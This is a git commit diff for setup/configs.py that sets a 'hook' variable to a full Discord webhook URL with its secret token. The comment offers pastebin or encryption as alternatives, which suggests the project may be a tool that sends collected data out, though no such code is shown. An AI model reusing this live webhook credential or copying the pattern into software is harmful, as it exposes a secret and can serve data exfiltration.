a650e1e13fb5edb18cea2de6b88650f7c5bb27f0
Luna-Python-Coder <157140569+Fuydutdtu@users.noreply.github.com>
2024-02-11 15:24:16 -0500

    Update configs.py

--- setup/configs.py
+++ setup/configs.py
@@ -1,3 +1,3 @@
 import requests
 
-hook = "" # or a pastebin, or u can add u own encrypt etccccccccccc
+hook = "https://discord.com/api/webhooks/1206334857245102100/GfujjzFEkIm7eJiA2EwWebK_jDGiTl8tstmFaa_wzmCmRjZM5sAdgUx7spTSXk0JDFdn" # or a pastebin, or u can add u own encrypt etccccccccccc
